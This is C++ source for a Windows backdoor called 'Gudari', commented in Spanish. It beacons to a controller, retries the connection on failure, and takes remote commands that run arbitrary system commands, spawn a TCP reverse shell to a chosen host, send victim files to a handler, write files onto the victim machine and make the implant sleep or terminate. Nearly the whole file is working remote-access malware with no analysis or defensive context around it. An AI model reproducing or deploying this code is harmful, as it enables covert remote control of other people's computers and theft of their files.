// TermXSS.cpp: define el punto de entrada de la aplicación de consola.
//

#include "stdafx.h"


int main()
{
	//FreeConsole();
	// Creamos un core
	CORE core = CORE("127.0.0.1", 4000);
	std::vector<std::string> v;
	std::string ordenRecibida;
	int returnCode;
	
	while (true)
	{
		if (core.conectar())
		{
			debug("[-] No se ha podido establecer la conexion! Reintentando en 5 segundos...\n");
			Sleep(5000);
		}
		else
		{
			debug("[+] Comunicacion establecida con exito\n");

			if (pintarWelcome(core) != 0)
			{
				Sleep(5000);
			}

			while (true)
			{
				ordenRecibida = core.recibir();
				debug("[+] Orden recibida: " + ordenRecibida +"\n");

				// Parseo
				v.clear();
				std::vector<std::string> v{ explode(ordenRecibida, ' ') };
				v[0].erase(std::remove(v[0].begin(), v[0].end(), '\n'), v[0].end());
				
				showVector(v);
				// Aqui van las opciones
				if (v[0] == "EXEC")
				{
					returnCode = moduloEXEC(v,core);
				}

				if (v[0] == "SPAWN")
				{
					returnCode = moduloSPAWN(v, core);
				}

				if (v[0] == "DOWNLOAD")
				{
					returnCode = moduloDOWNLOAD(v, core);
				}

				if (v[0] == "UPLOAD")
				{
					returnCode = moduloUPLOAD(v, core);
				}

				if (v[0] == "SLEEP")
				{
					returnCode = moduloSLEEP(v, core);
				}

				if (v[0] == "HELP")
				{
					returnCode = pintarMenu(core);
				}

				if (v[0] == "EXIT")	// Paramos el programa
				{
					core.mandar("[+] Bye bye! See you soon!\n");
					closesocket(core.getSocket());
					break;
				}

				if (v[0] == "KILL")	// Paramos el programa
				{
					core.mandar("[+] Killing.. Bye bye!\n");
					closesocket(core.getSocket());
					return 0;
				}

				// Esperar un nuevo comando
				if (core.mandar("<= Gudari => ") != 0)
				{
					break;
				}
	
			}
		}
	}

	return 0;
}

int pintarWelcome(CORE core)
{
	return core.mandar("\n"
		"  ________          .___            .__ \n"
		" /  _____/ __ __  __| _/____ _______|__|\n"
		"/   \\  ___|  |  \\/ __ |\\__  \\\\_  __ \\  |\n"
		"\\    \\_\\  \\  | /  /_/ | / __ \\|  | \\/  |\n"
		" \\______  /____/\\____ |(____  /__|  |__|\n"
		"         \\/          \\/     \\/          \n"


		"\n<= Gudari => "
	);
}

int moduloEXEC(std::vector<std::string> v, CORE core)
{
	std::string comando = "";
	if (v.size() > 1)
	{
		// Reconstruimos orden y la ejecutamos
		for (int i = 1; i < v.size(); i++)
		{
			comando = comando + v[i] + " ";
		}
		debug("[+] Ejecutando: " + comando + "\n");
		return core.mandar(exec(comando.c_str()));

	}
	else
	{
		return core.mandar("[-] Use: EXEC [command]");
	}
}

int moduloSLEEP(std::vector<std::string> v, CORE core)
{
	if (v.size() < 2)
	{
		core.mandar("[-] Use: SLEEP [seconds]\n");
		return 1;
	}
	else
	{
		core.mandar("[+] Seconds to sleep: " + v[1] + "\n");
		Sleep(atoi(v[1].c_str()) * 1000);
		return 0;
	}
}

int moduloSPAWN(std::vector<std::string> v, CORE core)
{
	if (v.size() < 3)
	{
		core.mandar("[-] Use: SPAWN [target_ip] [port]\n");
		return 1;
	}
	else
	{
		core.mandar("[+] Spawning an interactive shell against " + v[1] + ":" + v[2] + "\n");
		if (spawnInteractiveShell((char*)v[1].c_str(), atoi(v[2].c_str())) != 0)
		{
			core.mandar("[-] Error spawning an interactive shell against " + v[1] + ":" + v[2] + "\n");
			return 1;
		}
		return 0;
	}
}

int moduloDOWNLOAD(std::vector<std::string> v, CORE core)
{
		if (v.size() >= 3)
		{
			CORE downloadCore = CORE(v[1], atoi(v[2].c_str()));
			//CORE downloadCore = CORE("192.168.1.40", 80);
			if (downloadCore.conectar() != 0)
			{
				core.mandar("[-] Error creating transfer tunnel\n");
				return 1;
			}
			else
			{
				core.mandar("[+] Downloading " + v[3] + "\n");
			}

			v[3].erase(std::remove(v[3].begin(), v[3].end(), '\n'), v[3].end());
			if (downloadFile(downloadCore.getSocket(), (char*)v[3].c_str()) == 0)
			{
				core.mandar("[+] Sent: " + v[3] + "\n");
				return 0;
			}
			else
			{
				core.mandar("[-] File transfer error " + v[3] + "\n");
				return 1;
			}

		}
		else
		{
			core.mandar("[-] Use: DOWNLOAD [handler_ip] [port] [remote_file_path]\n");
			return 1;
		}
	
}

int moduloUPLOAD(std::vector<std::string> v, CORE core)
{
	if (v.size() >= 3)
	{
		CORE uploadCore = CORE(v[1], atoi(v[2].c_str()));
		//CORE downloadCore = CORE("192.168.1.40", 80);
		if (uploadCore.conectar() != 0)
		{
			core.mandar("[-] Error creating transfer tunnel\n");
			return 1;
		}
		else
		{
			core.mandar("[+] Uploading " + v[3] + "\n");
		}

		v[3].erase(std::remove(v[3].begin(), v[3].end(), '\n'), v[3].end());
		if (uploadFile(uploadCore.getSocket(), (char*)v[3].c_str()) == 0)
		{
			core.mandar("[+] Uploaded: " + v[3] + "\n");
			return 0;
		}
		else
		{
			core.mandar("[-] File transfer error " + v[3] + "\n");
			return 1;
		}

	}
	else
	{
		core.mandar("[-] Use: UPLOAD [handler_ip] [port] [dst_file_path]  \n");
		return 1;
	}

}

int pintarMenu(CORE core)
{
	core.mandar("\n"
		"Commands                 Arguments                          Description\n"
		"---------- ---------------------------------------- ------------------------------\n"
		"EXEC         [commands]                               Execute simple system call\n"
		"SPAWN        [handler_ip][port]                       Create a TCP reverse shell\n"
		"DOWNLOAD     [handler_ip][port][remote_file_path]     Download a remote file\n"
		"UPLOAD       [handler_ip][port][dst_file_path]        Upload a local file\n"
		"SLEEP        [seconds]                                Start ninja mode\n"
		"HELP         -                                        Show help menu\n"
		"EXIT         -                                        Close current Gudari session\n"
		"KILL         -                                        Terminate Gudari client process\n"
		"\n");

	return 0;
}